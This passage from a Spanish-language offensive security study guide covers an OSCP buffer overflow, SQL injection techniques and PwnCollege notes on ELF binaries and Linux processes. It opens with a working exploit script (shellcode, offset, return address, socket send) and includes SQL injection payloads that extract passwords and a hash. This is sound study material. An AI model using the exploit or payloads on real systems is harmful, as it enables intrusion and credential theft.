shellcode += b&quot;\xa9\x1f\x9b\xf3\x51\xc8\x4a\x27\x35\xa2\xd1\x60\x03&quot;
shellcode += b&quot;\x55\x72\xf5\xcc\x0b\xd2\x2a\xda\x41\x4d\x5f\x4f\xb4&quot;
shellcode += b&quot;\x2f\xbb\xc6\x88\x45\x5f\x3e\x11\x08\x86\x09\x5d\xe7&quot;
shellcode += b&quot;\xf8\x11\x49\x5c\x12\xdc\x8e\x66\xa0\x1e\x1c\x10\x0a&quot;
shellcode += b&quot;\xf8\xa7\xac\x6b\x8d\xd4\x2a\xaa\xe6\x5e\x9d\xbe\x04&quot;
shellcode += b&quot;\x42\x52\xe0\x71\x86\xc5\xa6\xa2\xff\xdf\xcb\x75\x28&quot;
shellcode += b&quot;\x2f\x5b\x05\x57\x39\x45\xd2\x7e\x05\xd6\x91\xfd\x46&quot;
shellcode += b&quot;\x2c\x31\x66\xea\xbe\x3c\xc8\x10\x96\xf6\xcc\x31\xbc&quot;
shellcode += b&quot;\x56\x43\x24\x1f\x86\xed\xf2\x59\xa2\x38\x9c\x4f\xa1&quot;
shellcode += b&quot;\xc6\x58\x71\xb7\x81\x9d\xe3\x25\xb7\xc7\xf4\x5c\xa3&quot;
shellcode += b&quot;\x01\xd4\x5e\xf2\x1d\x92\x57\x08\x65\xd9\x62\xdf\xb4&quot;
shellcode += b&quot;\xdf\xaa\xb8\x6a\x61\x82\x87\xfa\x27\x0c\xe9\x49\x46&quot;
shellcode += b&quot;\xea\x50\x51\xb6\x6b\xc9\xbc\xe4\x95\xff\xf8\x36\x94&quot;
shellcode += b&quot;\x3b\xbd\x24\xd9\x9c\xb5\x1e\x77\xcb\x31\x84\x2a\xe3&quot;
shellcode += b&quot;\xca\xac\xd7\x8c\x12\xed\xa0\x53\xfa\xbc\x94\xf3\x9b&quot;
shellcode += b&quot;\xe5\x8a\xac\xf3\x48\x1a\x39\x2e\x63\x5a\x68\xe9\x85&quot;
shellcode += b&quot;\x93\xde\x3a\x22\x77\x2a\xac\xa1\xfa\x96\x7f\x9f\x95&quot;
shellcode += b&quot;\x6f\xa3\xe4\x13\x41\x9a\xe8\xf6\x97\x6b\x2d\x31\x68&quot;
shellcode += b&quot;\x9c\xb1\x2f\xab\xa3\xf5\x56\xe9\xf5\xa3\x21\xe9\x9c&quot;
shellcode += b&quot;\x19\xaf\x10\x57\xfb\x80\x0e\x73\x48\x84\xb1\xb0\xb0&quot;
shellcode += b&quot;\x83\x67\x88\xb5\x1d\x0e\x73\xeb\xa1\xd1\xdc\xa2\xe9&quot;
shellcode += b&quot;\x76\xcc\xd0\x27\x6b\xed\x5d\xfc\x02\xcb\x8f\xff\xc3&quot;
shellcode += b&quot;\xb2\x8f\xf3\xee\x96\x9a\xec\xb1\x73\x55\x47\x82\x70&quot;
shellcode += b&quot;\x10\x32\x53\xbb\xfa\x83\x38\x3b\xb0\xea\xd1\xe4\x6e&quot;
shellcode += b&quot;\x2f\x7d\x23\xc5\xd9\x5d\xfb\x48\x06\x3d\x4f\x33\xfe&quot;
shellcode += b&quot;\x03\x9c&quot;

if __name__ == &quot;__main__&quot;:
    #buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x83\xEC\x10&quot; + shellcode
    buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x90&quot; * 16 + shellcode
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.send(&quot;%s\r\n&quot; % buffer)
    except Exception as ex:
        print &quot;[!] Ha habido un error de conexion&quot;
        print ex
        sys.exit(1)
</code></pre>
<p><strong>Consideraciones</strong></p>
<p>Si bien se pueden utilizar algunos &quot;trucos&quot; para caer en la dirección donde se encuentra el shellcode como lo son los <code>NOPs (\x90)</code> se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de <code>msf-nasm_shell</code> se puede invocar la instrucción <code>sub esp, &lt;valor en hexadecimal&gt;</code>. Ejemplo:</p>
<p><img src="guides/oscp_bof/./images/bof_10.png" alt="OP code de sub" /></p>
<p>En este caso se obtendría el valor <code>83EC10</code> como código de operación para el desplazamiento de 10 unidades. quedando la línea de construcción del payload como: <code>buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x83\xEC\x10&quot; + shellcode</code> en lugar de los <code>NOPs</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="inyección-sql"><a class="header" href="#inyección-sql">Inyección SQL</a></h1>
<h2 id="tipos-de-inyección-sql"><a class="header" href="#tipos-de-inyección-sql">Tipos de inyección SQL</a></h2>
<ul>
<li>In-Band (Classic).
<ul>
<li>Error.</li>
<li>Union.</li>
</ul>
</li>
<li>Inferential (Blind).
<ul>
<li>Boolean.</li>
<li>Time.</li>
</ul>
</li>
<li>Out-of-Band.</li>
</ul>
<h3 id="in-band-classic"><a class="header" href="#in-band-classic">In-Band (Classic)</a></h3>
<ul>
<li>Ocurren cuando el atacante usa el mismo canal de comunicación tanto para lanzar el ataque como para obtener el resultado del ataque.
<ul>
<li>La data obtenida es presentada directamente en la página web de la aplicación.</li>
</ul>
</li>
<li>Es más fácil de expotar en comparación con otras categorías de SQLi.</li>
<li>Existen dos tipos:
<ul>
<li>Error-based SQLi.</li>
<li>Union-based SQLi.</li>
</ul>
</li>
</ul>
<h4 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error-based SQLi</a></h4>
<ul>
<li>Es una técnica empleada para forzar a la base de datos a generar un error, dándodle al atacante información para poder redefinir la inyección.</li>
<li>Ejemplo:</li>
</ul>
<p>Input:</p>
<p><code>www.random.com/app.php?id='</code></p>
<p>Output:</p>
<p><code>You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...</code></p>
<p>En este caso se estaría agregando como valor del parámetro <code>id</code> el caracter <code>'</code> (comilla simple) para causar el error, añadiendo este caracter a la consulta generada por la aplicación.</p>
<h4 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h4>
<ul>
<li>Es una técnica que emplea el operador SQL <code>UNION</code> para combinar los resultados de dos consultas en un sólo set de resultados.</li>
<li>Ejemplo:</li>
</ul>
<p>Input:</p>
<p><code>www.random.com/app.php?id=' UNION SELECT username, password FROM users--</code></p>
<p>Output:</p>
<pre><code>carlos
rtdgfdfcv0uc90xc
administrator
xdr3asrt3'0o90ki
</code></pre>
<p>En este caso el output de la segunda consulta se pudiera visualizar en los campos o lugares correspondientes a la consulta que normalmente hace la aplicación.</p>
<h3 id="inferential-blind"><a class="header" href="#inferential-blind">Inferential (Blind)</a></h3>
<ul>
<li>Es una vulnerabilidad donde no existe como tal una transferencia de datos por medio de la aplicación web.</li>
<li>Independientemente que el atacante no pueda desplegar información directamente de la base de datos no le resta peligrosidad a la vulnerabilidad.
<ul>
<li>El atacante tiene la capacidad de reconstruir información al enviar ciertas peticiones y observar los resultados del comportamiento del servidor de base de datos.</li>
</ul>
</li>
<li>Toma más tiempo que las inyecciones In-Band.</li>
<li>Existen dos tipos:
<ul>
<li>Boolean-based SQLi.</li>
<li>Time-based SQLi.</li>
</ul>
</li>
</ul>
<h4 id="boolean-based-blind-sqli"><a class="header" href="#boolean-based-blind-sqli">Boolean-based Blind SQLi</a></h4>
<ul>
<li>Es una técnica que emplea condiciones booleanas para devolver diferentes resultados dependiendo de si la consulta generada retorna <code>TRUE</code> o <code>FALSE</code>.</li>
</ul>
<p>URL de ejemplo:</p>
<p><code>www.random.com/app.php?id=1</code></p>
<p>Consulta de Backend:</p>
<p><code>select title from product where id = 1</code></p>
<p>Payload #1 (FALSE)</p>
<p><code>www.random.com/app.php?id=1 and 1=2</code></p>
<p>Consulta de Backend:</p>
<p><code>select title from product where id = 1 and 1=2</code></p>
<p>Payload #2 (TRUE)</p>
<p><code>www.random.com/app.php?id=1 and 1=1</code></p>
<p>Consulta de Backend:</p>
<p><code>select title from product where id = 1 and 1=1</code></p>
<h5 id="caso-práctico"><a class="header" href="#caso-práctico">Caso Práctico</a></h5>
<p>Se busca extraer el hash del usuario <code>Administrator</code> de la tabla de usuarios.</p>
<p>Tabla Users:</p>
<p><code>Administrator / 4cfef044f55be76daef66309146c60b5</code></p>
<p>Payload:</p>
<p><code>www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'</code></p>
<p>Consulta de Backend:</p>
<p><code>select title from product where id = 1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'</code></p>
<p>Al enviar el payload no retorna ningún producto la página, por lo tanto devuelve <code>FALSE</code> con lo que se puede concluir que <code>'s'</code> no es el primer caracter del hash de la contraseña.</p>
<p>Este proceso se vuelve iterativo por lo que se puede probar con todos los caracteres disponibles. Tomando en cuenta el caso práctico para devolver <code>TRUE</code> quedaría de la siguiente manera.</p>
<p>Payload:</p>
<p><code>www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = '4'</code></p>
<p>Consulta de Backend:</p>
<p><code>select title from product where id = 1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = '4'</code></p>
<p>De esta manera se cumplen ambas condiciones, es decir, que exista un producto con el id 1 y que el primer caracter del hash es <code>4</code>. Siendo así la consulta devolverá por ende <code>TRUE</code>.</p>
<h4 id="time-based-sqli"><a class="header" href="#time-based-sqli">Time-based SQLi</a></h4>
<ul>
<li>Es una técnica que emplea el pausado de la base de datos por un cierto periodo de tiempo para después retornar los resultados, indicando una ejecución correcta de la consulta de SQL.</li>
<li>Ejemplo de consulta a la base de datos:</li>
</ul>
<p>Si el primer caracter del hash de la contraseña del usuario administrator es 'a', realiza una pausa por 10 segundos.</p>
<ul>
<li>Si la respuesta tarda en responder 10 segundos, el primer caracter es 'a'.</li>
<li>Si la respuesta no tarda en responder 10 segundos, el primer caracter no es 'a'.</li>
</ul>
<h3 id="out-of-band"><a class="header" href="#out-of-band">Out-of-Band</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pwncollege"><a class="header" href="#pwncollege">PwnCollege</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-what-is-computer-systems-security"><a class="header" href="#introduction-what-is-computer-systems-security">Introduction: What is Computer Systems Security</a></h1>
<ul>
<li><a href="https://docs.google.com/presentation/d/1YlTxeZg03P234EgG4E4JNGcit6LZovAxfYGL1YSLwfc/edit?usp=sharing">Diapositivas</a></li>
<li><a href="https://www.youtube.com/watch?v=2chgNhxt-Kc">Extended Q&amp;A 8/19/2021</a></li>
</ul>
<h1 id="fundamentals"><a class="header" href="#fundamentals">Fundamentals</a></h1>
<h2 id="computer-architecture"><a class="header" href="#computer-architecture">Computer Architecture</a></h2>
<ul>
<li>John Mauchly (Físico).</li>
<li>John Presper Eckbert (Ingeniero eléctrico).</li>
<li>John Von Neumann (Matemático).</li>
</ul>
<p>John Von Neumann, EDVAC, 1945.</p>
<p><img src="guides/pwncollege/0_module/images/computer_arch.png" alt="Arquitectura de computadoras como se conoce al día de hoy" /></p>
<h2 id="introduction-to-binary-files"><a class="header" href="#introduction-to-binary-files">Introduction to Binary Files</a></h2>
<p>Partiendo de un binario de sistema como lo es <code>/bin/cat</code>, buscando responder a la pregunta:</p>
<pre><code class="language-bash">❯ file /bin/cat
/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7b3c4131450fabd010fe74ac5589074c9431cf4a, for GNU/Linux 3.2.0, stripped
</code></pre>
<h3 id="what-is-an-elf"><a class="header" href="#what-is-an-elf">What is an ELF?</a></h3>
<ul>
<li>Executable and Linkable Format.</li>
<li>ELF es un formato de archivo binario.</li>
<li>Contiene el programa y su data.</li>
<li>Describe como un programa debería ser cargado (program/segment headers).</li>
<li>Contiene metadata que describen los componentes del programa (section headers).</li>
</ul>
<h3 id="elf-program-headers"><a class="header" href="#elf-program-headers">ELF Program Headers</a></h3>
<ul>
<li>Especifícan la información requerida para preparar el programa para su ejecución. Los tipos de entrada más importantes son:
<ul>
<li><strong>INTERP:</strong> define la librería que debería ser usada para cargar este ELF en la memoria.</li>
<li><strong>LOAD:</strong> define una parte del archivo que debería ser cargada en la memoria.</li>
</ul>
</li>
<li>Son la fuente de información usada cuando se carga un archivo.</li>
</ul>
<p><em>Extracción de <code>readelf -a /bin/cat</code>:</em></p>
<pre><code class="language-bash">Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000001540 0x0000000000001540  R      0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000004819 0x0000000000004819  R E    0x1000
  LOAD           0x0000000000007000 0x0000000000007000 0x0000000000007000
                 0x0000000000001f28 0x0000000000001f28  R      0x1000
  LOAD           0x0000000000009c50 0x000000000000ac50 0x000000000000ac50
                 0x0000000000000630 0x00000000000007c8  RW     0x1000
  DYNAMIC        0x0000000000009df8 0x000000000000adf8 0x000000000000adf8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000007eb0 0x0000000000007eb0 0x0000000000007eb0
                 0x00000000000002e4 0x00000000000002e4  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000009c50 0x000000000000ac50 0x000000000000ac50
                 0x00000000000003b0 0x00000000000003b0  R      0x1
</code></pre>
<h3 id="elf-section-headers"><a class="header" href="#elf-section-headers">ELF Section Headers</a></h3>
<ul>
<li>Son una vista diferente de un ELF con información útil para introspección, debuggeo, etc.</li>
<li>Secciones importantes:
<ul>
<li><strong>.text:</strong> el código ejecutable del programa.</li>
<li><strong>.plt</strong> y <strong>.got:</strong> usado para resolver y despachar llamadas de librerías.</li>
<li><strong>.data:</strong> usado por data global pre-inicializada que se puede modificar (así como arreglos globales con valores iniciales).</li>
<li><strong>.rodata:</strong> usada por data de sólo lectura (tal como cadenas de caracteres constantes).</li>
<li><strong>.bss:</strong> usada por data global no inicializada que se puede modificar (así como arreglos globales sin valores iniciales).</li>
</ul>
</li>
<li>Los Section headers <em>no</em> son necesariamente una parte del ELF, sólo segmentos definidos por los program headers son necesarios para su carga y su operación.</li>
<li>Los Section headers son sólo metadata.</li>
</ul>
<h3 id="symbols"><a class="header" href="#symbols">Symbols</a></h3>
<ul>
<li>Binarios (y librerías) que usen librerías cargadas dinámicamente dependen de los <code>symbols</code> (los nombres) para encontrar las librerías, y resolver las llamadas a funciones a esas librerías, etc.</li>
</ul>
<p><img src="guides/pwncollege/0_module/images/symbols.jpg" alt="Tabla de symbols" /></p>
<h3 id="interacting-with-your-elf"><a class="header" href="#interacting-with-your-elf">Interacting with your ELF</a></h3>
<ul>
<li><strong>gcc</strong> para crear el ELF.</li>
<li><strong>readelf</strong> para analizar el header del ELF.</li>
<li><strong>objdump</strong> para analizar el header del ELF y desensamblar el código fuente.</li>
<li><strong>nm</strong> para visualizar los symbols del ELF.</li>
<li><strong>patchelf</strong> para cambiar algunas propiedades del ELF.</li>
<li><strong>objcopy</strong> para intercambiar secciones del ELF.</li>
<li><strong>strip</strong> para remover información relevante (tal como los symbols).</li>
<li><strong>katai</strong> struct (http://ide.kaitai.io/) para visualizar a través del ELF interactivamente.</li>
</ul>
<h2 id="linux-process-loading"><a class="header" href="#linux-process-loading">Linux Process Loading</a></h2>
<h3 id="portrait-of-a-process"><a class="header" href="#portrait-of-a-process">Portrait of a process</a></h3>
<p>Cada proceso de Linux tiene:</p>
<ul>
<li>estado (running, waiting, stopped, zombie).</li>
<li>prioridad (y otro tipo de información relacionada a la programación/planificación).</li>
<li>padre, hermanos, hijos.</li>
<li>recursos compartidos (archivos, pipes, sockets).</li>
<li>espacio en memoria virtual.</li>
<li>contexto de seguridad.
<ul>
<li>uid y gid efectivos.</li>
<li>uid y gid guardados.</li>
<li>capabilities.</li>
</ul>
</li>
</ul>
<h3 id="but-where-do-processes-come-from"><a class="header" href="#but-where-do-processes-come-from">But where do processes come from?</a></h3>
<p>En Linux, los procesos ¡se progagan por mitosis!</p>
<p>Mediante <strong>fork</strong> y (más reciente) <strong>clone</strong> son llamadas a sistema que crean una casi idéntica copia  del proceso del que lo está llamando: un padre y un hijo.</p>
<p>Después, el proceso hijo usualmente usa la syscall <strong>execve</strong> para remplazarse a sí mismo con otro proceso.</p>
<p>Ejemplo:</p>
<ul>
<li>Cuando se usa <code>/bin/cat</code> en bash.</li>
<li>bask hace un <strong>fork</strong> de sí mismo a un viejo proceso padre y al proceso hijo.</li>
<li>El proceso hijo usa <strong>execve</strong> <code>/bin/cat</code> transformándose en <code>/bin/cat</code>.</li>
</ul>
<h3 id="can-we-load"><a class="header" href="#can-we-load">Can we load?</a></h3>
<p>Antes que cualquier cosa sea cargada, el kernel verifica los permisos de ejecución.</p>
<p>Si un archivo no es ejecutable, <strong>execve</strong> fallará.</p>
<h3 id="what-to-load"><a class="header" href="#what-to-load">What to load?</a></h3>
<p>Para identificar que cargar, el kernel de Linux lee la primera parte del archivo (<code>/bin/cat</code> por ejemplo) y toma una decisión:</p>
<ol>
<li>Si el archivo empieza con <strong>#!</strong> (lo que es conocido como el shebang), el kernel extrae el intérprete del resto de la línea y ejecuta el intérprete con el archivo original como argumento.</li>
<li>Si el archivo corresponde al formato de <code>/proc/sys/fs/binfmt_misc</code>, el kernel ejecuta el intérprete especificado por ese formato con el archivo original como argumento.</li>
<li>Si el archivo es un ELF enlazado dinámicamente, el kernel lee el intérprete/loader definido en el ELF, carga el intérprete y el archivo original, y deja que el intérprete tome el control.</li>
<li>Si el archivo es un ELF enlazado estáticamente, el kernel lo cargará.</li>
<li>Otros formatos de archivos legacy son verificados.</li>
</ol>
<p>¡Esto puede ser recursivo!</p>
<h3 id="dynamically-linked-elfs-the-interpreter"><a class="header" href="#dynamically-linked-elfs-the-interpreter">Dynamically linked ELFS: the interpreter</a></h3>
<p>La carga del proceso es realizada por el intérprete del ELF específicado en el binario.</p>
<pre><code class="language-bash">❯ readelf -a /bin/cat | grep interpreter
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre>
<p>Coloquialmente conocido como &quot;the loader&quot;.</p>
<p>Puede ser sobreescrito: <code>/lib64/ld-linux-x86-64.so.2 /bin/cat /flag</code></p>
<p>O cambiado permanentemente <code>patchelf --set-interpreter</code></p>
<h3 id="dynamically-linked-elfs-the-loading-process"><a class="header" href="#dynamically-linked-elfs-the-loading-process">Dynamically linked ELFS: the loading process</a></h3>
<ol>
<li>El programa y su intérprete son cargados por el kernel.</li>
<li>El intérprete ubica las librerías.
<ol>
<li>La variable de entorno <code>LD_PRELOAD</code>, y cualquier cosa que se encuentre en <code>/etc/ld.so.preload</code>.</li>
<li>La variable de entorno <code>LD_LIBRARY_PATH</code> (puede ser configurada en la shell).</li>
<li><code>DT_RUNPATH</code> o <code>DT_RPATH</code> especificados en el binario (ambos pueden ser modificados por patchelf).</li>
<li>Configuración del sistema (<code>/etc/ld.so.conf</code>).</li>
<li><code>/lib</code> y <code>/usr/lib</code>.</li>
</ol>
</li>
<li>El intérprete carga las librerías.
<ol>
<li>Estas librerías pueden depender de otras, causando que también sean cargadas.</li>
<li>Actualización de reubicaciones.</li>
</ol>
</li>
</ol>
<h3 id="where-is-all-this-getting-loaded-to"><a class="header" href="#where-is-all-this-getting-loaded-to">Where is all this getting loaded to?</a></h3>
<p>Cada proceso en Linux tiene un espacio de memoria virtual. El cuál contiene:</p>
<ul>
<li>El binario.</li>
<li>Las librerías.</li>
<li>El &quot;heap&quot; (para la memoria asignada dinámicamente).</li>
<li>El &quot;stack&quot; (para variables locales de funciones).</li>
<li>Cualquier memoria escíficamente mapeada por el programa.</li>
<li>Algunas regiones de apoyo.</li>
<li>Código de kernel en la &quot;mitad superior&quot; de la memoria (arriba de 0x80000000000000 en arquitecturas de 64 bits), inaccesibles por el proceso.</li>
</ul>
<p>La memoria virtual es dedicada al proceso.</p>
<p>La memoria física es compartida por todo el sistema.</p>
<p>Se puede visualizar todo el espacio mirando en <code>/proc/self/maps</code>.</p>
<h3 id="the-standard-c-library"><a class="header" href="#the-standard-c-library">The Standard C library</a></h3>
<p>libc.so es enlazada a casi cada proceso.</p>
<p>Provee de funcionalidada para:</p>
<ul>
<li>printf().</li>
<li>scanf().</li>
<li>socket().</li>
<li>atoi().</li>
<li>malloc().</li>
<li>free().</li>
</ul>
<p>...y a otro tipo de cosas</p>
<ul>
<li>xdr_keystatus()</li>
</ul>
<h3 id="the-loading-process-for-statically-linked-binaries"><a class="header" href="#the-loading-process-for-statically-linked-binaries">The loading process (for statically linked binaries)</a></h3>
<ol>
<li>El binario es cargado.</li>
</ol>
<h3 id="cat-is-initialized"><a class="header" href="#cat-is-initialized">Cat is initialized</a></h3>
<p>Cada binario ELF puede especificar constructores, los cuales son funciones que son ejecutados antes de que el programa sea lanzado.</p>
<p>Por ejemplo, dependiendo en la versión, libc puede inicializar regiones en la memoria para asignaciones dinámicas (malloc/free) cuando el programa sea ejecutado.</p>
<p>¡Es posible especificar los propios!</p>
<pre><code class="language-c">__attribute__((constructor)) void haha() {
    write(1, &quot;Hello world!\n&quot;, 6);
}
</code></pre>
<p>Permitiendo ser válido también para <code>LD_PRELOAD</code>.</p>
<h2 id="linux-process-runtime"><a class="header" href="#linux-process-runtime">Linux Process Runtime</a></h2>
<h3 id="cat-is-launched"><a class="header" href="#cat-is-launched">Cat is launched</a></h3>
<p>Un ELF normal automáticamente llama <code>__libc_start_main()</code> en libc, lo cuál llama a la función <code>main()</code> del programa.</p>
<p>¡El código se está ejecutando!</p>
<p>¿Ahora qué?</p>
<h3 id="cat-reads-its-arguments-and-environment"><a class="header" href="#cat-reads-its-arguments-and-environment">Cat reads its arguments and environment</a></h3>
<p><code>int main(int argc, void **argv, void **envp);</code></p>
<p>Todo el input del programa proveniente del mundo exterior, al momento de la ejecución, comprende de:</p>
<ul>
<li>Los objetos cargados (binarios y librerías).</li>
<li>Argumentos de la línea de comandos en argv.</li>
<li>Variables de entorno o &quot;environment&quot; en envp.</li>
</ul>
<p>Por supuesto, el programa necesita seguir interactuando con el mundo exterior.</p>
<h3 id="using-library-functions"><a class="header" href="#using-library-functions">Using library functions</a></h3>
<p>La operación del binaro <em>import symbols</em> necesita ser resuelta usando la operación <em>export symbols</em> de las librerías.</p>
<p>En el pasado, esto era un proceso on-demand y llevaba consigo un gran peligro.</p>
<p>Hoy en día, esto es hecho hecho cuando el binario es cargado y es mucho más seguro.</p>
<p>Se explorará este punto más adelante.</p>
<h3 id="interacting-with-the-environment"><a class="header" href="#interacting-with-the-environment">Interacting with the environment</a></h3>
<p>Casi todos los programas tienen que interactuar con el mundo exterior.</p>
<p>Esto es realizado principalmente via llamadas a sistema (<code>man syscalls</code>). Cada llamada a sistema se encuentra bien documentada en la sección 2 de las páginas del manual. (ejemplo <code>man 2 open</code>).</p>
<p>Se le puede dar seguimiento a los procesos de las llamadas a sistema usando <code>strace</code>.</p>
<h3 id="system-calls"><a class="header" href="#system-calls">System Calls</a></h3>
<p>Las llamadas a sistema tienen interfaces bien definidas que rara vez cambian.</p>
<p>Existen más de 300 llamadas a sistema en Linux. Por ejemplo:</p>
<ul>
<li><code>int open(const char *pathname, int flags)</code> - retorna un archivo y un nuevo descriptor de archivo del archivo que se abrió (esto también aparece en <code>/proc/self/fd</code>).</li>
<li><code>ssize_t read(int fd, void *buf, size_t count)</code> - lee la data del descriptor de archivo.</li>
<li><code>ssize_t write(int fd, void *buf, size_t count)</code> - escribe la data en el descriptor de archivo.</li>
<li><code>pid_t fork()</code> - bifurca o crea un proceso identico como hijo. Retorna 0 si eres el hijo y el PID del hijo si eres el padre.</li>
<li><code>int execve(const char *filename, char **argv, char **envp)</code> - remplaza tus procesos.</li>
<li><code>pid_t wait(int *wstatus)</code> - espera el termino del hijo, retorna su PID, escribe su estatus en *wstatus.</li>
<li><code>long syscall(long syscall, ...)</code> - invoca el syscall especificado.</li>
</ul>
<p>Combinaciones de señales típicas:</p>
<ul>
<li>fork, execve, wait (como una shell).</li>
<li>open, read, write (cat).</li>
</ul>
<h3 id="signals"><a class="header" href="#signals">Signals</a></h3>
<p>Las llamadas a sistema son una forma en la el proceso interactúa con el sistema operativo. Pero ¿qué pasa al revés?</p>
<p>Llamadas a sistema relevantes:</p>
<ul>
<li><code>sighandler_t signal(int signum, sighandler_t handler)</code> - registra un manejador de señales.</li>
<li><code>int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact)</code> - una forma más moderna de registrar un manejador de señales.</li>
<li><code>int kill(pid_t pid, int sig)</code> - manda una señal a un proceso.</li>
</ul>
<p>Las señales pausan la ejecución del proceso e invocan el manejador.</p>
<p>Los mandejadores son funciones que toman un argumento: el número de señal.</p>
<p>Sin un manejador para una señal, la acción por defecto es usada (casi siempre, kill).</p>
<p>SIGKILL (signal 9) y SIGSTOP (signal 19) no pueden ser gestionadas.</p>
<p>Lista completa en la sección 7 del manual (<code>man 7 signal</code>) y <code>kill -l</code>. Señales comúnes:</p>
<div class="table-wrapper"><table><thead><tr><th>Señal</th><th>Tipo</th><th>Descripción</th></tr></thead><tbody>
<tr><td><code>SIGHUP</code></td><td>Term</td><td>Hangup detectado de terminal controlada o muerte de proceso controlado</td></tr>
<tr><td><code>SIGINT</code></td><td>Term</td><td>Interrupción por teclado</td></tr>
<tr><td><code>SIGQUIT</code></td><td>Core</td><td>Abandono por teclado</td></tr>
<tr><td><code>SIGILL</code></td><td>Core</td><td>Instrucción Ilegal</td></tr>
<tr><td><code>SIGABRT</code></td><td>Core</td><td>Señal de aborto de abort(3)</td></tr>
<tr><td><code>SIGFPE</code></td><td>Core</td><td>Excepción de punto flotante</td></tr>
<tr><td><code>SIGKILL</code></td><td>Term</td><td>Señal de kill</td></tr>
<tr><td><code>SIGSEGV</code></td><td>Core</td><td>Referencia de memoria inválida</td></tr>
<tr><td><code>SIGPIPE</code></td><td>Term</td><td>Pipe rota: escritura a pipe sin lectores; ver pipe(7)</td></tr>
<tr><td><code>SIGALRM</code></td><td>Term</td><td>Señal de timer de alarm(2)</td></tr>
<tr><td><code>SIGTERM</code></td><td>Term</td><td>Señal de termino</td></tr>
<tr><td><code>SIGUSR1</code></td><td>Term</td><td>Señal 1 definida por usuario</td></tr>
<tr><td><code>SIGUSR2</code></td><td>Term</td><td>Señal 2 definida por usuario</td></tr>
<tr><td><code>SIGCHLD</code></td><td>Ign</td><td>Hijo pausado o terminado</td></tr>
<tr><td><code>SIGCONT</code></td><td>Cont</td><td>Reanudar si estaba pausado</td></tr>
<tr><td><code>SIGSTOP</code></td><td>Stop</td><td>Parar proceso</td></tr>
<tr><td><code>SIGTSTP</code></td><td>Stop</td><td>Parar escrito en terminal</td></tr>
<tr><td><code>SIGTTIN</code></td><td>Stop</td><td>Input de terminal para proceso en segundo plano</td></tr>
<tr><td><code>SIGTTOU</code></td><td>Stop</td><td>Output de terminal para proceso en segundo plano</td></tr>
</tbody></table>
</div>
<h3 id="shared-memory"><a class="header" href="#shared-memory">Shared memory</a></h3>
<p>Otra manera de interactuar con el mundo exterior es mediante la compartición de memoria con otros procesos.</p>
<p>Requiere que se establezcan llamadas a sistema, pero una vez establecidas la comunicación ocurre sin ellas.</p>
<p>La forma más fácil es usar el archivo de shared memory-mapped ubicado en <code>/dev/shm</code>.</p>
<h3 id="process-termination"><a class="header" href="#process-termination">Process termination</a></h3>
<p>Los procesos terminan de alguna de estas dos formas:</p>
<ol>
<li>Recibiendo una señal no gestionada.</li>
<li>Llamando llamada a sistema <code>exit()</code>: <code>int exit(int status)</code>.</li>
</ol>
<p>Todos los procesos tienen que ser &quot;cosechados&quot;:</p>
<ul>
<li>Después de su termino, permanecerán en un estado zombie hasta use el <code>wait()</code> de sus padres.</li>
<li>Cuando esto pasa, su código de salida será retornado al padre y el proceso será liberado.</li>
<li>Si el padre muere win usar <code>wait()</code> en ellos, son reparentados al PID 1 y permanecerán ahí hasta que sean limpiados.</li>
</ul>
<h2 id="assembly-code"><a class="header" href="#assembly-code">Assembly Code</a></h2>
<h3 id="assembly"><a class="header" href="#assembly">Assembly</a></h3>
<p>Es el único verdadero lenguaje de programación, en que se refiere a un CPU.</p>
<p>Conceptos:</p>
<ul>
<li>Intrucciones.
<ul>
<li>Manipulación de data.</li>
<li>Comparación.</li>
<li>Control de flujo.</li>
<li>System calls</li>
</ul>
</li>
<li>Registros.</li>
<li>Memoria.
<ul>
<li>Programa.</li>
<li>Pila.</li>
<li>Otra memoria mapeada.</li>
</ul>
</li>
</ul>
<h3 id="registers"><a class="header" href="#registers">Registers</a></h3>
<p>Los registros son bastante rápidos, temporalmente guardan data.</p>
<p>Algunos utilizados para &quot;propósitos generales&quot;:</p>
<ul>
<li>8085: a, c, d, b, e, h, l.</li>
<li>8086: ax, cx, dx, bx, <strong>sp</strong>, <strong>bp</strong>, si, di.</li>
